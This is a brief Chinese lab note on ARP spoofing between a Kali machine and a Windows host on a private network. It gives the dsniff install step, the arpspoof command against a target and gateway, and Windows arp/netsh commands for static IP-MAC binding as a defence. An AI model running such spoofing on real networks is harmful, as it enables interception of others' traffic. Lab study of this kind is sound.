# 攻击者

**kail:192.168.188.134**
下载地址：https://mirrors.aliyun.com/kali-images/kali-2021.3/kali-linux-2021.3-live-i386.iso

# 被攻击者：

**WINDOWS: 192.168.188.132**

# 安装

 `sudo apt-get install dsniff`

# 攻击

```
arpspoof -i eth0 -t 目标 -r 网关
```

`arp -a` 查看IP和MAC绑定关系

`arp -d` 绑定动态MAC绑定关系

`netsh i i show in`查看要进行ARP绑定的网卡的idx编号。

`netsh -c ”i i” add neighbors 名称 IP MAC地址`    绑定命令，注意名称，IP，MAC地址 中间有空格